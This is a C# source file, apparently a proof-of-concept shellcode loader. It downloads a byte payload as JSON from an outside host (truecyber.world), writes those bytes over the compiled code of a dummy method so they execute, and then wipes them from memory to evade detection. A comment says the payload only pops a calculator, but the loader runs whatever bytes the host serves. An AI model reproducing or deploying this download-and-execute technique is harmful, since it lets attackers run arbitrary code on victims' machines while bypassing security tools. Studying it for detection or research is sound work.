using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Threading;
using System.Web.Script.Serialization;

public class APIDATA
{
    public Dictionary<string, string> items { get; set; }
    public int code { get; set; }
}
public class Program
{
    private static byte[] shellcode;

    public static IntPtr GetMethodAddress(MethodInfo method)
    {

        RuntimeMethodHandle handle = method.MethodHandle;
        RuntimeHelpers.PrepareMethod(handle);
        return handle.GetFunctionPointer();

    }
    static int CalculatePadding(int size)
    {
        int padding = 16 - (size % 16);
        if (padding == 0)
        {
            return 0;
        }
        return padding;
    }

    public static void Dummy()
    {
        Console.WriteLine("Hello I'm a useless method");
    }
    static void Main(string[] args)
    {
        Program.Dummy();
		
		    // the URL point to a dummy calc pop shellcode
		    // the code is available in the report under data.php
        APIDATA data = GetApiResponse<APIDATA>("https://truecyber.world/data.php");
        int size = data.items.Count + CalculatePadding(data.items.Count);
        Program.shellcode = new byte[size];
        foreach(KeyValuePair<string, string> item in data.items)
        {
            Program.shellcode[Int32.Parse(item.Key)] = Byte.Parse(item.Value);

        }

        ProtectedMemory.Protect(Program.shellcode, MemoryProtectionScope.SameProcess);
        MethodInfo mi = typeof(Program).GetMethod("Dummy", BindingFlags.Static | BindingFlags.Public);

        IntPtr addr = GetMethodAddress(mi);

        unsafe
        {

            byte* ptr = (byte*)addr.ToPointer();
            ProtectedMemory.Unprotect(Program.shellcode, MemoryProtectionScope.SameProcess);
            for (int i = 0; i < Program.shellcode.Length; i++)
            {
                ptr[i] = Program.shellcode[i];
            }
        }

        Thread t = new Thread(() => ProgramCleanUp(addr));
        t.Start();
        Program.Dummy();
    }

    static void ProgramCleanUp(IntPtr addr)
    {
        Thread.Sleep(5000);
        ProtectedMemory.Protect(Program.shellcode, MemoryProtectionScope.SameProcess);
        unsafe
        {

            byte* ptr = (byte*)addr.ToPointer();
            for (int i = 0; i < Program.shellcode.Length; i++)
            {
                ptr[i] = 0xc3;
            }
        }
    }
    public static T GetApiResponse<T>(string url)
    {
        try
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            request.Accept = "application/json";

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                string json = reader.ReadToEnd();
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                T result = serializer.Deserialize<T>(json);

                return result;
            }
        }
        catch (Exception e)
        {
         
        }

        return default(T);
    }
}
